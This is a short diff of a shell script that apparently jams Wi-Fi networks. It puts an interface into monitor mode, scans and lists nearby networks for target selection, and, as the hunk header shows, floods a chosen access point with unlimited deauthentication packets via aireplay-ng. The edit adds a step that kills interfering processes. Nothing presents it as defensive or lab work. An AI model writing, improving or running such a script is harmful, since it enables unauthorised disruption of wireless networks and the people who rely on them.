@@ -426,13 +426,14 @@ aireplay-ng --deauth 0 -a $bssid $foo > /dev/null
 }
 
 monitor () {        ##### Monitor mode, scan available networks & select target #####
+airmon-ng check kill
 spinner &
 airmon-ng start $foo > /dev/null
 trap "airmon-ng stop $foo > /dev/null;rm generated-01.kismet.csv 2> /dev/null" EXIT 
 airodump-ng --output-format kismet --write generated $foo > /dev/null & sleep 20 ; kill $!
 sed -i '1d' generated-01.kismet.csv
 kill %1
-airmon-ng stop $foo
+#airmon-ng stop $foo
 echo -e "\n\n${Red}SerialNo        WiFi Network${White}"
 cut -d ";" -f 3 generated-01.kismet.csv | nl -n ln -w 8
 targetNumber=1000
